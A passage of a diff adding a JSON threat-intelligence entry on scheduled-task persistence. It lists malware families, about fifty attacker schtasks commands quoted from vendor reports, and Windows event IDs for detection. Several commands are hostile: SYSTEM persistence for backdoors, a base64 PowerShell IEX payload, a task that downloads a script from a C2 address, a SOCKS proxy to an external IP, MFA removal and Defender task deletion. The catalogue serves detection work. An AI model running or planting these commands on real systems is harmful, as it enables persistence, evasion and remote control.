+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "IcedID",
+        "attack_id": "S0483",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "InvisiMole",
+        "attack_id": "S0260",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "ISMInjector",
+        "attack_id": "S0189",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "JHUHUGIT",
+        "attack_id": "S0044",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "JSS Loader",
+        "attack_id": "S0648",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "LitePower",
+        "attack_id": "S0680",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Machete",
+        "attack_id": "S0409",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "Matryoshka",
+        "attack_id": "S0167",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Maze",
+        "attack_id": "S0449",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "Meteor",
+        "attack_id": "S0688",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "Milan",
+        "attack_id": "S1015",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "NETWIRE",
+        "attack_id": "S0198",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "NotPetya",
+        "attack_id": "S0368",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Okrum",
+        "attack_id": "S0439",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "OopsIE",
+        "attack_id": "S0264",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "POWRUNER",
+        "attack_id": "S0184",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Prestige",
+        "attack_id": "S1058",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Pteranodon",
+        "attack_id": "S0147",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "QakBot",
+        "attack_id": "S0650",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "QUADAGENT",
+        "attack_id": "S0269",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "RainyDay",
+        "attack_id": "S0629",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "Remexi",
+        "attack_id": "S0375",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "RemoteCMD",
+        "attack_id": "S0166",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Revenge RAT",
+        "attack_id": "S0379",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "RTM",
+        "attack_id": "S0148",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "Ryuk",
+        "attack_id": "S0446",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Saint Bot",
+        "attack_id": "S1018",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Shamoon",
+        "attack_id": "S0140",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "SharpStage",
+        "attack_id": "S0546",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Sibot",
+        "attack_id": "S0589",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Smoke Loader",
+        "attack_id": "S0226",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "SoreFang",
+        "attack_id": "S0516",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "SQLRat",
+        "attack_id": "S0390",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Stuxnet",
+        "attack_id": "S0603",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "SUGARDUMP",
+        "attack_id": "S1042",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "SVCReady",
+        "attack_id": "S1064",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "TrickBot",
+        "attack_id": "S0266",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Valak",
+        "attack_id": "S0476",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Zebrocy",
+        "attack_id": "S0251",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "ZxxZ",
+        "attack_id": "S1013",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "Empire",
+        "attack_id": "S0363",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "IronNetInjector",
+        "attack_id": "S0581",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "Koadic",
+        "attack_id": "S0250",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "MCMD",
+        "attack_id": "S0500",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "PowerSploit",
+        "attack_id": "S0194",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "QuasarRAT",
+        "attack_id": "S0262",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      }
+    ],
+    "associated_commands": [
+      {
+        "command": "Schtasks.exe /Create /TN \"UpdatesxjZWstBWrIuw\" /XML C:UsersxxxxxxAppDataLocalTemptmp1718.tmp",
+        "intent": "Persistence: create a scheduled task from an XML file so the dropped copy of Agent Tesla keeps running.",
+        "status": "verified",
+        "source_name": "SentinelLabs Agent Tesla Aug 2020",
+        "source_url": "https://labs.sentinelone.com/agent-tesla-old-rat-uses-new-tricks-to-stay-on-top/"
+      },
+      {
+        "command": "schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\"",
+        "intent": "Persistence: the malware component test.exe creates a scheduled task that runs it at logon as System.",
+        "status": "verified",
+        "source_name": "FireEye Operation Double Tap November 2014",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/operation-doubletap/"
+      },
+      {
+        "command": "SCHTASKS  /Change  /tn \"\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\" /TR \"C:\\windows\\system32\\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\\windows\\system32\\msiexec.exe /Z c:\\programdata\\S-1-5-18.dat\" /RL HIGHEST /RU \"\" /ENABLE",
+        "intent": "Persistence: modify an existing SYSTEM task to run APT41's DEADEYE launcher through rundll32 and msiexec.",
+        "status": "verified",
+        "source_name": "Mandiant APT41 US State Governments March 2022",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/apt41-us-state-governments"
+      },
+      {
+        "command": "schtasks /create /s <remote host> /u “<user>” /p “<password>” /ru “SYSTEM” /tn one /sc MONTHLY /tr “c:\\ users\\public\\filepak.exe 20191101” /F",
+        "intent": "Collection: run the Filepak file collection tool on a remote host as SYSTEM.",
+        "status": "verified",
+        "source_name": "Bitdefender FunnyDream Campaign November 2020",
+        "source_url": "https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf"
+      },
+      {
+        "command": "schtasks /create /ru \"SYSTEM\" /tn \"update\" /tr \"cmd /c c:\\windows\\temp\\update.bat\" /sc once /f /st 06:59:00",
+        "intent": "The adversary schedules a batch file that loads the Cobalt Strike beacon or runs discovery commands.",
+        "status": "verified",
+        "source_name": "Fox-IT Abusing Cloud Services January 2021",
+        "source_url": "https://blog.fox-it.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/"
+      },
+      {
+        "command": "\"C:\\Windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR \"c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe\"",
+        "intent": "POWERSTATS backdoor persistence: a daily task named MicrosoftEdge starts the backdoor's execution chain through wscript and Windows.vbe.",
+        "status": "verified",
+        "source_name": "ClearSky MuddyWater Operations in Lebanon and Oman November 2018",
+        "source_url": "https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf"
+      },
+      {
+        "command": "schtasks.exe /RU SYSTEM /create /sc ONCE /<user> /tr \"cmd.exe /crundll32.exe c:\\programdata\\netsh.dll,Entry\" /ST 04:43",
+        "intent": "Persistence: a task run as SYSTEM uses rundll32 to run a malicious DLL (netsh.dll).",
+        "status": "verified",
+        "source_name": "CISA AA23-136A BianLian Ransomware Group May 2023",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a"
+      },
+      {
+        "command": "c:\\windows\\system32\\schtasks.exe /create /ru system /sc minute /tn microsoft\\windows\\wininet\\cachetask /tr c:\\:cachetask -b <bind port> /f",
+        "intent": "Persistence: run a reverse-SSH tool hidden in an alternate data stream of C:\\ every minute as SYSTEM.",
+        "status": "verified",
+        "source_name": "Cisco Talos BlackMatter to BlackCat March 2022",
+        "source_url": "https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/"
+      },
+      {
+        "command": "\"C:\\Windows\\System32\\schtasks.exe\" /CREATE /SC ONSTART /TN jf0c /TR \"'C:\\Users\\pagefilerpqy.exe'\" /f",
+        "intent": "Firefox.exe, run by the Bazar loader, created these scheduled tasks and a Run key to give persistence on the beachhead host.",
+        "status": "verified",
+        "source_name": "The DFIR Report Ryuk Speed Run November 2020",
+        "source_url": "https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/"
+      },
+      {
+        "command": "schtasks /create /tn K0adic /tr \"C:\\Windows\\system32\\mshta.exe C:\\ProgramData\\SZWXNUHHDP.hta\" /sc onlogon /ru System /f",
+        "intent": "Persistence was set up using Koadic to schedule a task that runs an HTA file from C:\\ProgramData at logon as SYSTEM, starting C2 back to the Koadic server.",
+        "status": "verified",
+        "source_name": "The DFIR Report PYSA Mespinoza Ransomware November 2020",
+        "source_url": "https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/"
+      },
+      {
+        "command": "schtasks.exe /Create /F /XML C:\\windows\\temp\\Wininet.xml /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'",
+        "intent": "The actor uploaded Wininet.xml through the web shell and used it to create a scheduled task that runs a batch script, to achieve persistence.",
+        "status": "verified",
+        "source_name": "The DFIR Report APT35 ProxyShell March 2022",
+        "source_url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+      },
+      {
+        "command": "schtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa))) \" /SC MINUTE /MO 30",
+        "intent": "The scheduled task created by Qbot runs every 30 minutes and executes a base64 encoded payload stored in the Windows Registry, for persistence on the beachhead host.",
+        "status": "verified",
+        "source_name": "The DFIR Report Qbot and Zerologon February 2022",
+        "source_url": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /C schtasks /create /F /tn “\\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager” /tr “C:\\Windows\\SoftwareDistribution\\EventCacheManager.exe” /sc ONSTART /ru system /S [machine_name]",
+        "intent": "During lateral movement the attacker also tried to create a SYSTEM scheduled task on a number of remote machines using schtasks.exe directly.",
+        "status": "verified",
+        "source_name": "Volexity Dark Halo SolarWinds December 2020",
+        "source_url": "https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/"
+      },
+      {
+        "command": "schtasks.exe /create /SC ONLOGON /tn \"\\Microsoft\\Windows\\DefenderUPDService\" /tr \"\\\"C:\\Windows\\system32\\rundll32.exe\\\" \\\"C:\\Windows\\system32\\AclNumsInvertHost.dll\\\",AclNumsInvertHost\"",
+        "intent": "The actor used the TeamCity RCE to create a scheduled task referencing the downloaded DLL, likely for persistence and to abstract execution from the exploit.",
+        "status": "verified",
+        "source_name": "Fortinet TeamCity Intrusion Saga APT29",
+        "source_url": "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793"
+      },
+      {
+        "command": "schtasks.exe /create /SC ONSTART /tn \"\\Microsoft\\Windows\\IISUpdateService\" /tr \"C:\\Windows\\WinStore\\iisexpresstray.exe\" /RU \"SYSTEM\" /f",
+        "intent": "The actor created a scheduled task through the TeamCity exploit to run iisexpresstray.exe and carry out DLL side-loading.",
+        "status": "verified",
+        "source_name": "Fortinet TeamCity Intrusion Saga APT29",
+        "source_url": "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793"
+      },
+      {
+        "command": "C:\\windows\\system32\\schtasks.exe /F /Create /TN Microsoft_Desktop /sc minute /MO 1 /TR C:\\Users\\Public\\Libraries\\active_desktop\\desktop_launcher.exe",
+        "intent": "The stager sets up persistence to run every minute on the infected endpoint by creating a scheduled task.",
+        "status": "verified",
+        "source_name": "Cisco Talos Mustang Panda Targets Europe",
+        "source_url": "https://blog.talosintelligence.com/mustang-panda-targets-europe/"
+      },
+      {
+        "command": "schtasks /create /sc minute /mo 2 /tn \"ServiceHub.TestWindowStoreHost\" /tr \"C:\\Users\\Public\\Pictures\\ServiceHub.TestWindowStoreHost.exe\" /f",
+        "intent": "The installer establishes persistence for the TONESHELL backdoors with this schtasks command.",
+        "status": "verified",
+        "source_name": "Trend Micro Earth Preta Spear-Phishing Governments November 2022",
+        "source_url": "https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html"
+      },
+      {
+        "command": "SCHTASKS /CREATE /sc minute /mo 10 /tn \"deep-thoughted\" /tr \"wscript.exe \" CSIDL_COMMON_PICTURES\\deep-thoughted.ppt //e:VBScript //b\" /F",
+        "intent": "A scheduled task is created to likely ensure persistence between reboots and to execute the dropped VBS file every 10 minutes.",
+        "status": "verified",
+        "source_name": "Symantec Shuckworm Gamaredon Espionage Ukraine",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine"
+      },
+      {
+        "command": "schtasks /create /sc minute /mo 1 /tn PlayerVLC /F /tr C:\\ProgramData\\PlayerVLC.vbs",
+        "intent": "The initial VBScript creates a scheduled task to persistently run the secondary VBScript every minute.",
+        "status": "verified",
+        "source_name": "Unit 42 Molerats Spark Backdoor March 2020",
+        "source_url": "https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/"
+      },
+      {
+        "command": "cmd.exe /C schtasks /create /F /sc minute /mo 1 /tn \"\\WindowsAppPool\\AppPool\" /tr \"wscript /b \"C:\\ProgramData\\WindowsAppPool\\AppPool.vbs\"\"",
+        "intent": "AppPool.vbs creates this scheduled task to execute every minute, which provides BONDUPDATER persistence.",
+        "status": "verified",
+        "source_name": "Unit 42 OilRig BONDUPDATER September 2018",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/"
+      },
+      {
+        "command": "SchTasks /Create /SC MINUTE /MO 3 /TN \"InetlSecurityAssistManager\" /TR \"wscript %path%\" /f",
+        "intent": "The Trojan creates a scheduled task to run itself every three minutes by running this command.",
+        "status": "verified",
+        "source_name": "Unit 42 OilRig OopsIE February 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/"
+      },
+      {
+        "command": "schtasks /create /sc MINUTE /tn \"Windows Error Reporting\" /tr \"mshta.exe about:'<script language=\\\"vbscript\\\" src=\\\"hxxp://110.10.179(.)65:80/download/microsoftp.jpg\\\">code close</script>'\" /mo 15 /F",
+        "intent": "The purpose of the scheduled task is to download another payload from the C&C server.",
+        "status": "verified",
+        "source_name": "Cybereason Operation Cobalt Kitty 2017",
+        "source_url": "https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf"
+      },
+      {
+        "command": "cmd.exe /C schtasks /create /tn WindowsConnSvc /tr C:\\Windows\\Temp\\svchost32.exe client 77.110.122[.]137:37182 R:1085:socks /sc minute /mo 2 /ru SYSTEM /f > C:\\Windows\\Temp\\RbHoNVNU.tmp 2>&1",
+        "intent": "The scheduled task was created to persist remote access, launching a disguised svchost32.exe SOCKS proxy client every 2 minutes.",
+        "status": "verified",
+        "source_name": "Huntress The Gentlemen Ransomware Defense Evasion TTPs",
+        "source_url": "https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps"
+      },
+      {
+        "command": "C:\\Windows\\system32\\schtasks.exe /create /tn “[REDACTED] CleanWipe” /tr “\\”C:\\Users\\[REDACTED]\\Downloads\\ CleanWipe.exe\\” --scheduler” /sc ONSTART /ru System",
+        "intent": "The affiliate tried to use a scheduled task to execute CleanWipe, a tool designed to remove a third-party security tool.",
+        "status": "verified",
+        "source_name": "CrowdStrike 2022 Falcon OverWatch Threat Hunting Report",
+        "source_url": "https://go.crowdstrike.com/rs/281-OBQ-266/images/2022OverWatchThreatHuntingReport.pdf"
+      },
+      {
+        "command": "SCHTASKS /create /ST 00:00:01 /SC MINUTE /MO 03 /TR “C:\\Users\\%USERNAME%\\AppData\\Roaming\\Chrome\\Google\\Chrome.exe” /TN Chrome",
+        "intent": "Machete creates tasks so that its spy component runs every 3 minutes.",
+        "status": "verified",
+        "source_name": "ESET Machete Just Got Sharper July 2019",
+        "source_url": "https://www.welivesecurity.com/wp-content/uploads/2019/08/ESET_Machete.pdf"
+      },
+      {
+        "command": "schtasks /create /tn \"OneDrive AutoRemove\" /tr \"C:\\Windows\\System32\\cmd.exe /c del /f /q C:/TEMP/[MagicRAT_file_name].exe\" /sc daily /st 10:30:30 /ru SYSTEM",
+        "intent": "MagicRAT achieves persistence by running a hardcoded command that creates scheduled tasks; the report lists this one as a scheduled task starting at a specific time.",
+        "status": "verified",
+        "source_name": "Cisco Talos MagicRAT Lazarus",
+        "source_url": "https://blog.talosintelligence.com/lazarus-magicrat/"
+      },
+      {
+        "command": "schtasks /create /tn \"Microsoft\\Windows\\light Service Manager\" /tr C:/TEMP/[MagicRAT_file_name].exe /sc onstart /ru SYSTEM",
+        "intent": "MagicRAT achieves persistence by running a hardcoded command that creates scheduled tasks; the report lists this one as a scheduled task starting at a different time and path.",
+        "status": "verified",
+        "source_name": "Cisco Talos MagicRAT Lazarus",
+        "source_url": "https://blog.talosintelligence.com/lazarus-magicrat/"
+      },
+      {
+        "command": "schtasks /create /sc minute /mo 1 /tn Skype /tr \"C:\\Users\\[Use]\\AppData\\Roaming\\xubntzl.txt\"",
+        "intent": "TA2541 has established persistence by creating scheduled tasks and adding entries in the registry.",
+        "status": "verified",
+        "source_name": "Proofpoint Charting TA2541 Flight",
+        "source_url": "https://www.proofpoint.com/us/blog/threat-insight/charting-ta2541s-flight"
+      },
+      {
+        "command": "schtasks.exe /CREATE /SC ONEVENT /EC application /mo *[System/EventID=777] /f /TN run /TR \"calc.exe\" & EVENTCREATE /ID 777 /L APPLICATION /T INFORMATION /SO DummyEvent /D \"Initiatescheduled task.\" & schtasks.exe /DELETE /TN run /f",
+        "intent": "The command abuses schtasks.exe for signed binary proxy execution, creating a task triggered by a dummy Windows event to run calc.exe, in an attempt to bypass detection.",
+        "status": "verified",
+        "source_name": "Proofpoint Serpent Backdoor French Entities",
+        "source_url": "https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain"
+      },
+      {
+        "command": "/c cd /d c:\\temp & schtasks /create /u <DOMAIN>\\<USERNAME> /p \"<PASSWORD>\" /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\s.ps1\" /tn win32times /f",
+        "intent": "The actor uses scheduled tasks to execute malicious code, typically PowerShell, on remote systems using credentials of privileged accounts.",
+        "status": "verified",
+        "source_name": "Fox-IT Operation Wocao December 2019",
+        "source_url": "https://www.fox-it.com/media/kadlze5c/201912_report_operation_wocao.pdf"
+      },
+      {
+        "command": "SCHTASKS /Create /S 192.168.100.19 /U \"{redacted}\\administrator\" /P \"!@#Virg0#@!\" /RU SYSTEM /SC DAILY /TN Exec2022 /TR \"C:\\windows\\system32\\taskhosts.exe\"",
+        "intent": "Task Scheduler was used to launch malicious files on computers where the threat actors already had sessions and on computers found during reconnaissance.",
+        "status": "verified",
+        "source_name": "Group-IB APT41 World Tour 2021",
+        "source_url": "https://www.group-ib.com/blog/apt41-world-tour-2021/"
+      },
+      {
+        "command": "schtasks /create /tn 'setup service Management' /tr 'c:\\windows\\temp\\rn.bat' /sc ONCE /st 00:00 /F /RU System /S remote_host",
+        "intent": "In some cases Scheduled Tasks were created remotely with schtasks.exe /S to ensure execution of the mining payload.",
+        "status": "verified",
+        "source_name": "Red Canary Blue Mockingbird May 2020",
+        "source_url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/"
+      },
+      {
+        "command": "schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR “[file path]” /ru system",
+        "intent": "Scheduled tasks and initialization scripts were used to maintain execution of Earth Lusca malware.",
+        "status": "verified",
+        "source_name": "Trend Micro Earth Lusca Operations Technical Brief",
+        "source_url": "https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/earth-lusca-employs-sophisticated-infrastructure-varied-tools-and-techniques/technical-brief-delving-deep-an-analysis-of-earth-lusca-operations.pdf"
+      },
+      {
+        "command": "cmd /c schtasks.exe /create /tn \"Lodging\" /tr \"wscript //B 'C:\\Users\\<username>\\AppData\\Local\\Innovative Analytics Solutions\\Quantifyr.js'\" /sc minute /mo 5 /F",
+        "intent": "SectopRAT created a scheduled task for persistence that runs Quantifyr.js every five minutes.",
+        "status": "verified",
+        "source_name": "Trend Micro Lumma Stealer GitHub Delivery January 2025",
+        "source_url": "https://www.trendmicro.com/en_us/research/25/a/lumma-stealers-github-based-delivery-via-mdr.html"
+      },
+      {
+        "command": "schtasks /create /tn \\Microsoft\\Office\\OfficeAgentLogOn2016 /tr \"C:\\Users\\Public\\PublicLib\\ MicrosoftUpdator.vbs\" /sc ONLOGON /ru [Redacted] /f",
+        "intent": "A task is scheduled to ensure the keylogger starts when the user logs in.",
+        "status": "verified",
+        "source_name": "Virus Bulletin Lyceum Counterintelligence in the Middle East 2021",
+        "source_url": "https://vblocalhost.com/uploads/VB2021-Kayal-etal.pdf"
+      },
+      {
+        "command": "schtasks /run /tn \"\\Microsoft\\Windows\\termsrv\\licensing\\TlsAccess\"",
+        "intent": "After creating a scheduled task for postgresql.exe, the attackers ran the task to execute the file.",
+        "status": "verified",
+        "source_name": "Symantec Ukraine Wiper Malware Russia February 2022",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia"
+      },
+      {
+        "command": "schtasks /create /tn WSPrint /tr \"C:\\ProgramData\\WSPrint\\WSPrint.exe\" /ru \"SYSTEM\" /sc onstart /F",
+        "intent": "TernDoor persists on the system through a scheduled task named WSPrint created with this command.",
+        "status": "verified",
+        "source_name": "Cisco Talos UAT-9244 TernDoor",
+        "source_url": "https://blog.talosintelligence.com/uat-9244/"
+      },
+      {
+        "command": "\"cmd.exe\" /c schtasks /create /tn \"SchedulerLsass\" /tr \"%ALLUSERSPROFILE%\\USOShared\\lsassa.exe\" /sc onstart",
+        "intent": "The threat actor used the backdoor to create a scheduled task on the beachhead host for persistence.",
+        "status": "verified",
+        "source_name": "The DFIR Report Lunar Spider September 2025",
+        "source_url": "https://thedfirreport.com/2025/09/29/from-a-single-click-how-lunar-spider-enabled-a-near-two-month-intrusion/"
+      },
+      {
+        "command": "schtasks /create /ru SYSTEM /tn \"OneDrive Security Task-S-1-5-21-REDACTED\" /tr c:\\windows\\adfs\\py\\UpdateEdge.bat /SC ONSTART /F",
+        "intent": "The threat actor created multiple scheduled tasks to achieve persistence on the beachhead host and each host moved to laterally.",
+        "status": "verified",
+        "source_name": "The DFIR Report Nitrogen Sliver BlackCat September 2024",
+        "source_url": "https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/"
+      },
+      {
+        "command": "schtasks.exe /create /f /tn \"Adobe Update\" /xml \"C:\\ProgramData\\Adobe\\adobeupd.xml\"",
+        "intent": "The malware drops an XML template and uses schtasks.exe with it to create the persistence task.",
+        "status": "verified",
+        "source_name": "Kaspersky GoldenJackal APT Group May 2023",
+        "source_url": "https://securelist.com/goldenjackal-apt-group/109677/"
+      },
+      {
+        "command": "\"C:\\Windows\\system32\\schtasks.exe\" /create /tn SoftwareProtection /tr \"\"C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\SoftwareProtectionPlatform\\run.exe\" \"C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\SoftwareProtectionPlatform\\udp.pyw\"\" /sc minute /mo 5 /f",
+        "intent": "The attacker establishes persistence with a scheduled task named SoftwareProtection that runs the malicious Python payload every five minutes.",
+        "status": "verified",
+        "source_name": "Trend Micro KongTuke ClickFix WordPress March 2026",
+        "source_url": "https://www.trendmicro.com/en_us/research/26/c/kongtuke-clickfix-abuse-of-compromised-wordpress-sites.html"
+      },
+      {
+        "command": "schtasks /create /sc minute /mo 5 /tn LKUFORYOU_1 /tr C:\\ProgramData\\UsersDate\\Windows_NT\\Windows\\User\\Desktop\\x32dbg.exe /f",
+        "intent": "A scheduled task disguised as LKUFORYOU_1 executes x32dbg.exe, which side-loads PlugX, every five minutes.",
+        "status": "verified",
+        "source_name": "Trend Micro PlugX Disguised as Windows Debugger Tool February 2023",
+        "source_url": "https://www.trendmicro.com/en_us/research/23/b/investigating-the-plugx-trojan-disguised-as-a-legitimate-windows.html"
+      },
+      {
+        "command": "schtasks /create /tn \\Microsoft\\Windows\\Clip2 /tr \"rundll32 C:\\programdata\\vmnat\\Test\\log.ini,Start\" /ru System /sc minute /mo 90 /f",
+        "intent": "The actor created a scheduled task on a hypervisor to run a malicious DLL masquerading as an .ini file that connects to the external C2.",
+        "status": "verified",
+        "source_name": "Sophos Crimson Palace New Tools Tactics Targets",
+        "source_url": "https://www.sophos.com/en-us/blog/crimson-palace-new-tools-tactics-targets"
+      },
+      {
+        "command": "SCHTASKS /s [internal IP address] /RU \"SYSTEM\" /create /tn \"WindowsSensor15\" /tr \"cmd.exe /c wmic product where name=\"Duo Authentication for Windows Logon x64\" call uninstall /nointeractive\" /sc ONCE /sd 01/01/2025 /st 00:00",
+        "intent": "The attacker tried to uninstall MFA through a WMIC command nested within a scheduled task designed to run in the system context.",
+        "status": "verified",
+        "source_name": "Sophos 3AM Ransomware Vishing and Quick Assist",
+        "source_url": "https://www.sophos.com/en-us/blog/a-familiar-playbook-with-a-twist-3am-ransomware-actors-dropped-virtual-machine-with-vishing-and-quick-assist"
+      },
+      {
+        "command": "SCHTASKS.exe /create /sc minute /mo 10 /tn \"Autodesk plugin\" /tr \"\"\"\"C:\\ProgramData\\Smadav\\SmadavNSK\\Smadav.exe\"\"\" 644\" /f",
+        "intent": "In some SOGU variants an additional scheduled task is created to run the malware every 10 minutes to maintain persistence.",
+        "status": "verified",
+        "source_name": "Mandiant Infected USB Drives to Steal Secrets July 2023",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/infected-usb-steal-secrets/"
+      },
+      {
+        "command": "C:\\Windows\\system32\\schtasks.exe /create /tn {guid} /tr cmd.exe /C \"start /MIN C:\\Windows\\system32\\cscript.exe /E:javascript \"C:\\Users\\USERNAME\\ymwoyf.wpl\" /sc WEEKLY /D TUE,WED,THU /ST 12:00:00 /F",
+        "intent": "Once infected, the victim machine creates a scheduled task that executes a JavaScript downloader requesting hijacked domains.",
+        "status": "verified",
+        "source_name": "Cisco Talos Qakbot Levels Up May 2019",
+        "source_url": "https://blog.talosintelligence.com/qakbot-levels-up-with-new-obfuscation/"
+      },
+      {
+        "command": "schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f",
+        "intent": "Under defense evasion, Windows Defender scheduled scans were deleted from the servers the threat actor pivoted to.",
+        "status": "verified",
+        "source_name": "The DFIR Report Gootloader May 2022",
+        "source_url": "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/"
+      }
+    ]
+  },
+  "detections": {
+    "eventsid": [
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4698,
+        "data_components": "Scheduled Job Creation",
+        "techniques": "T1053.005, T1036.004"
+      },
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4702,
+        "data_components": "Scheduled Job Modification",
+        "techniques": "T1053.005"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 1,
+        "data_components": "Process Creation",
